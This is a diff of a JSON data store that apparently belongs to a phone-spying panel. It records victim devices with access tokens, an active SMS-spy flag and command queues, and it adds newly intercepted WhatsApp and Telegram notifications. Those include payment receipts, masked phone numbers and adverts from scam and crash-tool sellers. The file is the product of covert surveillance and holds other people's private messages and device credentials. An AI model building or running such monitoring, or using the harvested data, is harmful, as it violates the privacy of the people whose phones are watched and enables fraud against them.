@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778271348,
+    "lastSeen": 1776778274545,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (112 pesan): ~ kaisar",
+        "content": "📷 NEXTT MKSIH SOLD 130K \nTAWARIN LAGI EPEP 100K SAMPAI 200K",
+        "time": "21/04 20:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778273046
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:52",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775921335
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3527 pesan dari 20 chat",
-        "time": "21/04 19:51",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775899764
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778268788,
+    "lastSeen": 1776778271940,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,102 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / NU*********\n🏦 Method: DANA\n💰 Amount: Rp 3.300\n💸 Fee: Rp 153\n💵 Total Payload: Rp 3.453\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421212631241896\n🏷️ System ID: FSCL48120547\n⏰ 21 Apr 2026 • 20:29 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778274563
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 ⏤͟͟͞͞✆BranzModss ⎙\n🆔 8371645260\n⏰ 21/4/2026, 13.31.07",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778274546
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "🕒 Stiker",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778274455
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16849 pesan baru dari 118 obrolan",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778274377
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / NU*********\n🏦 Method: DANA\n💰 Amount: Rp 3.300\n💸 Fee: Rp 153\n💵 Total Payload: Rp 3.453\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421212631241896\n🏷️ System ID: FSCL48120547\n⏰ 21 Apr 2026 • 20:29 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778273769
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "🕒 Stiker",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778273675
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 ⏤͟͟͞͞✆BranzModss ⎙\n🆔 8371645260\n⏰ 21/4/2026, 13.31.07",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778273660
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16849 pesan baru dari 118 obrolan",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778273545
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 ⏤͟͟͞͞✆BranzModss ⎙\n🆔 8371645260\n⏰ 21/4/2026, 13.31.07",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778272953
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16849 pesan baru dari 118 obrolan",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778272748
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778272730
+      },
+      {
+        "appName": "Telegram",
+        "sender": "./j4X¡tsme な #sa #flory 🎖️",
+        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
+        "time": "21/04 20:31",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778272681
+      },
       {
         "appName": "Telegram",
         "sender": "ROOM PUBLIK BY JEFF: Rose",
@@ -14306,102 +14402,6 @@
         "time": "21/04 20:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777363697
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16798 pesan baru dari 118 obrolan",
-        "time": "21/04 20:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777363545
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 20:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777353972
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / AZ*********\n🏦 Method: DANA\n💰 Amount: Rp 2.500\n💸 Fee: Rp 211\n💵 Total Payload: Rp 2.711\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421211135241814\n🏷️ System ID: FSCL76336051\n⏰ 21 Apr 2026 • 20:15 WIB\n\n#DEPOSIT #DANA",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777335797
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @IkyyNotDev2 ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777335782
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
-        "content": "♻️ Restarting bot...",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777335763
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16797 pesan baru dari 118 obrolan",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777335742
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Yøriē Qwērty ʚɞ [ OPEN MANTA'X ]",
-        "content": "✨✨✨   ✨✨✨✨✨\n\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n\n⪼━━〔 FEATURE 🤍 〕━━⪻\n➡️Banyak layanan ready\n➡️OTP langsung masuk⚡️\n➡️Deposit QRIS instan\n➡️Harga mulai 1K🪙\n➡️Server stabil & fast🤔\n➡️Online 24/7\n➡️ Ada Kode Voucher nya\n➡️New user free balance 300p⛏\n\n💬 Layanan:\nWA📱 • Telegram📱 • Gmail • IG📱\nTikTok📱 • FB📱 • Shopee • dll\n\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n\n😡 START SEKARANG",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777335721
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
-        "content": "Pol",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777333726
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******99\n• Waktu: 21/04/2026, 20.13",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777333701
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Phil Godlewski 4.0",
-        "content": "Community Zoom Sessions Continue! 📢\n\nOur community Zoom sessions with managers are continuing today\n\nWhether you want to:\n\n💬 Ask questions about the Atom Venture ecosystem\n📊 Learn more about what’s happening across our projects\n‼️ Get the latest updates, especially on Arteki\n💭 Join the conversation with the team \n\n– You have the chance to join throughout this entire week\n\n🗓 Today’s available session slots are:\n10 AM, 12 PM, 5 PM, 7 PM, 9 PM, and 11 PM Eastern time\n\n📍 Head to meet.boostyfi.com and book your slot\n\nSee you on Zoom  🙌",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777333687
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
-        "content": "♻️ Restarting bot...",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777333661
-      },
-      {
-        "appName": "Telegram",
-        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
-        "content": "Hey there just call me dimzz, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
-        "time": "21/04 20:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777333647
       }
     ],
     "galleryPhotos": [],
